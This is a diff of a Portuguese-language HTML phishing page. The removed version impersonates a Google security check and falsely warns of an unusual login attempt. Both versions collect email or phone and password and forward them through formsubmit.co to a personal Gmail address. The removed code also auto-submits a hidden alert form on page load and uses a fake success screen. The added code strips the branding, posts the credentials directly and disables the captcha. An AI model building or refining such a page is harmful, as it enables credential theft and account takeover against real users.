@@ -2,7 +2,8 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Google - Verificação de segurança digital</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificação de Segurança</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,7 +11,7 @@
       text-align: center;
       padding: 50px;
     }
-    #form-container, #confirmation {
+    #form-container {
       background: white;
       padding: 30px;
       border-radius: 8px;
@@ -18,10 +19,7 @@
       margin: auto;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    #confirmation {
-      display: none;
-    }
-    input[type="text"], input[type="password"] {
+    input {
       width: 100%;
       padding: 10px;
       margin: 10px 0 20px;
@@ -38,66 +36,21 @@
       width: 100%;
       font-size: 16px;
     }
-    button:hover {
-      background-color: #45a049;
-    }
   </style>
 </head>
 <body>
 
-  <!-- Formulário invisível para enviar o alerta 7 -->
-  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" id="autoForm" style="display:none;">
-    <input type="hidden" name="alerta" value="7" />
-  </form>
-
   <div id="form-container">
-    <h1>Google - Verificação de segurança digital</h1>
-    <p>Detectamos uma tentativa incomum de login. Por favor, confirme suas credenciais abaixo para continuar.</p>
+    <h1>Verificação de Segurança</h1>
+    <p>Confirme seus dados para continuar.</p>
 
-    <form id="userForm">
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
       <input type="text" name="email" placeholder="E-mail ou telefone" required />
       <input type="password" name="senha" placeholder="Senha" required />
+      <input type="hidden" name="_captcha" value="false">
       <button type="submit">Validar agora</button>
     </form>
   </div>
-
-  <div id="confirmation">
-    <h1>Conta confirmada com sucesso!</h1>
-    <p>Obrigado por verificar sua conta.</p>
-  </div>
-
-  <script>
-    // Envia o formulário invisível automaticamente ao carregar a página
-    window.onload = function () {
-      document.getElementById('autoForm').submit();
-    };
-
-    // Captura o envio do formulário visível para enviar via fetch e mostrar confirmação sem sair da página
-    document.getElementById('userForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      const form = event.target;
-      const formData = new FormData(form);
-
-      fetch('https://formsubmit.co/natanaelverissimo34@gmail.com', {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          // Esconde o formulário e mostra a mensagem de confirmação
-          document.getElementById('form-container').style.display = 'none';
-          document.getElementById('confirmation').style.display = 'block';
-        } else {
-          alert('Erro ao enviar os dados. Tente novamente.');
-        }
-      }).catch(() => {
-        alert('Erro ao enviar os dados. Tente novamente.');
-      });
-    });
-  </script>
 
 </body>
 </html>
